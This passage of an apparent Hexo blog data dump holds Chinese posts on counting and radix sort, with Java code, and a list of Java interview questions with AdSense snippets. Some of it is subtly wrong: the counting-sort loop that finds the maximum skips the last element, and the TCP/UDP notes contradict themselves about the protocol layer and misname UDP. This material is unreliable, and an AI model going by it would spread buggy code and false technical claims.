a.length;</span><br><span class=\"line\">        <span class=\"comment\">/* 创建桶数组C */</span></span><br><span class=\"line\">        <span class=\"comment\">// 1、查找原数组的数据范围（必须是正整数）</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;a.length-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a[i]&gt;max)&#123;</span><br><span class=\"line\">                max = a[i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2、根据数据范围创建桶数组</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] C = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[max+<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"comment\">// 2.1、扫描原数组，将数据的个数放入桶C中</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> anA : a) &#123;</span><br><span class=\"line\">            C[anA]++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2.2、将C数组中的数据依次累加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=max;i++)&#123;</span><br><span class=\"line\">            C[i] = C[i-<span class=\"number\">1</span>] + C[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 3、根据C桶中的计数将原数组a中的数据依次放入A数组中</span></span><br><span class=\"line\">        <span class=\"comment\">// 3.1、创建临时数组A</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] A = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">        <span class=\"comment\">// 3.2、从后向前扫描a，并根据C放入A</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n-<span class=\"number\">1</span>; i&gt;=<span class=\"number\">0</span>; i--)&#123;</span><br><span class=\"line\">            A[C[a[i]]-<span class=\"number\">1</span>] = a[i];</span><br><span class=\"line\">            C[a[i]]--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 4、拷贝数组A到原数组a</span></span><br><span class=\"line\">        System.arraycopy(A, <span class=\"number\">0</span>, a, <span class=\"number\">0</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。</p>\n<p>总结一下，<strong>计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。</strong></p>\n<p>比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3></div><br></div>\n\n<p>我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？</p>\n<p>我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。</p>\n<p>刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。</p>\n<p>借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。</p>\n<p>手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/基数排序01.jpg\">\n<p>注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。</p>\n<p>根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。</p>\n<p>实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？</p>\n<p>实际上，<strong>我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”</strong>，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。</p>\n<p>总结一下，<strong>基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。</p>\n<p>实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。</p>\n<p>桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。</p>\n<p>假设我们现在需要对</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-排序优化","date":"2018-11-09T06:30:30.000Z","_content":"\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序优化.md","raw":"---\ntitle: 算法-排序优化\ndate: 2018-11-09 14:30:30\ntags:\ncategories:\n---\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序优化","published":1,"updated":"2018-11-29T09:59:50.760Z","_id":"cjpdmv00t00154cv0nh9oj9aj","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Java面试题","date":"2018-11-02T03:18:14.000Z","_content":"\n#### 1、HashMap和HashTable区别\nHashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能\n\n* HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；\n* HashMap允许将null作为key或value，hashtable不允许；\n* HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；\n* 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；\n* HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。\n* HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey\n* HashTable中数组默认大小是11，扩容方法是old\\*2+1;HashMap默认大小是16，扩容每次为2的指数大小\n\n#### 2、Object的hashcode方法，equals方法，常用的地方\n\n#### 3、HashMap的原理应用场景\n\n简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。\n\n#### 4、JDK中有哪些线程池\n\nJava中通过Executors提供四种线程池：\n* newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。\n* newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待\n* newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行\n* newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）\n\n#### 5、TCP/UDP区别\n\n**相同点**： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。\n\n| \t|               TCP \t\t\t\t\t  |                UDP   \t\t\t\t|\n|---|-----------------------------------------|-------------------------------------|\n|1\t|Transmission Control Protocol 传输控制协议| User Data Protocol 用户数据报协议 \t| \n|2\t|TCP的传输是可靠传输\t\t\t\t\t\t  | UDP的传输是不可靠传输               \t|\n|3  |TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接|UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去|\n|4  |TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信|UDP是一种不可靠的网络服务，负载相对较小|\n|5  |TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息|UDP包含长度和检验和信息|\n|6  |TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 |UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端|\n|7  |TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢|UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快|\n|8  |TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制|UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境|\n\n\n#### 6、查找一个数组的中位数\n\n#### 7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\n\n#### 8、Object类中的方法\n\n#### 9、对象比较是否相等\n\n#### 10、toString方法的常用地方，为什么要重写该方法\n\n#### 11、HashMap put方法怎么判断是否是重复方法\n\n#### 12、Set和List的区别\n\n#### 13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\n\n#### 14、TreeSet对存入的数据有什么要求吗？\n\n#### 15、HashSet是不是线程安全的\n\n#### 16、Java中有哪些线程安全的Map\n\n#### 17、CocurrentHashMap是怎么做到线程安全的\n\n#### 18、如何保证线程安全问题\n\n#### 19、volatile原子性问题？为什么i++不支持原子性\n\n#### 20、CAS操作\n\n#### 21、lock和synchronized区别\n\n#### 22、公平锁和非公平锁\n\n#### 23、Java读写锁，读写锁解决的问题\n\n#### 24、线程池的原理，为什么要创建线程池？创建线程池的方式？\n\n使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能\n\n#### 25、线程的生命周期，什么时候会出现僵死进程？\n\n#### 26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\n\n#### 27、volatile、ThreadLocal的使用场景和原理\n\n#### 28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\n\n#### 29、JVM内存模型、GC机制和原理\n\n#### 30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\n\n#### 31、JVM里有几种classloader，为什么会有多种。\n\nJVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。\n\n他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。\n\n当执行java \\*.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。\n\n#### 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\n\n双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。\n\n采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。\n\n#### 33、什么情况下需要破坏双亲委派机制\n\n1、基础类调用用户代码\n\n双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。\n\n为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。\n\n2、OSGi模块化热部署\n\nOSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。\n\n\n#### 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\n\n#### 35、红黑树的实现原理和应用场景\n\n#### 36、NIO是什么，适用于何种场景\n\n#### 37、\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Java面试题.md","raw":"---\ntitle: Java面试题\ndate: 2018-11-02 11:18:14\ntags: ['java','面试']\ncategories: 面试\n---\n\n#### 1、HashMap和HashTable区别\nHashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能\n\n* HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；\n* HashMap允许将null作为key或value，hashtable不允许；\n* HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；\n* 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；\n* HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。\n* HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey\n* HashTable中数组默认大小是11，扩容方法是old\\*2+1;HashMap默认大小是16，扩容每次为2的指数大小\n\n#### 2、Object的hashcode方法，equals方法，常用的地方\n\n#### 3、HashMap的原理应用场景\n\n简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。\n\n#### 4、JDK中有哪些线程池\n\nJava中通过Executors提供四种线程池：\n* newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。\n* newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待\n* newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行\n* newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）\n\n#### 5、TCP/UDP区别\n\n**相同点**： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。\n\n| \t|               TCP \t\t\t\t\t  |                UDP   \t\t\t\t|\n|---|-----------------------------------------|-------------------------------------|\n|1\t|Transmission Control Protocol 传输控制协议| User Data Protocol 用户数据报协议 \t| \n|2\t|TCP的传输是可靠传输\t\t\t\t\t\t  | UDP的传输是不可靠传输               \t|\n|3  |TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接|UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去|\n|4  |TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信|UDP是一种不可靠的网络服务，负载相对较小|\n|5  |TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息|UDP包含长度和检验和信息|\n|6  |TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 |UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端|\n|7  |TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢|UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快|\n|8  |TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制|UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境|\n\n\n#### 6、查找一个数组的中位数\n\n#### 7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\n\n#### 8、Object类中的方法\n\n#### 9、对象比较是否相等\n\n#### 10、toString方法的常用地方，为什么要重写该方法\n\n#### 11、HashMap put方法怎么判断是否是重复方法\n\n#### 12、Set和List的区别\n\n#### 13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\n\n#### 14、TreeSet对存入的数据有什么要求吗？\n\n#### 15、HashSet是不是线程安全的\n\n#### 16、Java中有哪些线程安全的Map\n\n#### 17、CocurrentHashMap是怎么做到线程安全的\n\n#### 18、如何保证线程安全问题\n\n#### 19、volatile原子性问题？为什么i++不支持原子性\n\n#### 20、CAS操作\n\n#### 21、lock和synchronized区别\n\n#### 22、公平锁和非公平锁\n\n#### 23、Java读写锁，读写锁解决的问题\n\n#### 24、线程池的原理，为什么要创建线程池？创建线程池的方式？\n\n使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能\n\n#### 25、线程的生命周期，什么时候会出现僵死进程？\n\n#### 26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\n\n#### 27、volatile、ThreadLocal的使用场景和原理\n\n#### 28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\n\n#### 29、JVM内存模型、GC机制和原理\n\n#### 30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\n\n#### 31、JVM里有几种classloader，为什么会有多种。\n\nJVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。\n\n他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。\n\n当执行java \\*.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。\n\n#### 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\n\n双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。\n\n采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。\n\n#### 33、什么情况下需要破坏双亲委派机制\n\n1、基础类调用用户代码\n\n双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。\n\n为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。\n\n2、OSGi模块化热部署\n\nOSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。\n\n\n#### 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\n\n#### 35、红黑树的实现原理和应用场景\n\n#### 36、NIO是什么，适用于何种场景\n\n#### 37、\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Java面试题","published":1,"updated":"2018-12-05T02:40:39.092Z","_id":"cjpdmv0ak002j4cv0sm8yvc7h","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1、HashMap和HashTable区别\"><a href=\"#1、HashMap和HashTable区别\" class=\"headerlink\" title=\"1、HashMap和HashTable区别\"></a>1、HashMap和HashTable区别</h4><p>HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能</p>\n<ul>\n<li>HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；</li>\n<li>HashMap允许将null作为key或value，hashtable不允许；</li>\n<li>HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；</li>\n<li>由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；</li>\n<li>HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。</li>\n<li>HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey</li>\n<li>HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小</li>\n</ul>\n<h4 id=\"2、Object的hashcode方法，equals方法，常用的地方\"><a href=\"#2、Object的hashcode方法，equals方法，常用的地方\" class=\"headerlink\" title=\"2、Object的hashcode方法，equals方法，常用的地方\"></a>2、Object的hashcode方法，equals方法，常用的地方</h4><h4 id=\"3、HashMap的原理应用场景\"><a href=\"#3、HashMap的原理应用场景\" class=\"headerlink\" title=\"3、HashMap的原理应用场景\"></a>3、HashMap的原理应用场景</h4><p>简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。</p>\n<h4 id=\"4、JDK中有哪些线程池\"><a href=\"#4、JDK中有哪些线程池\" class=\"headerlink\" title=\"4、JDK中有哪些线程池\"></a>4、JDK中有哪些线程池</h4><p>Java中通过Executors提供四种线程池：</p>\n<ul>\n<li>newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。</li>\n<li>newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待</li>\n<li>newScheduleThreadPool： 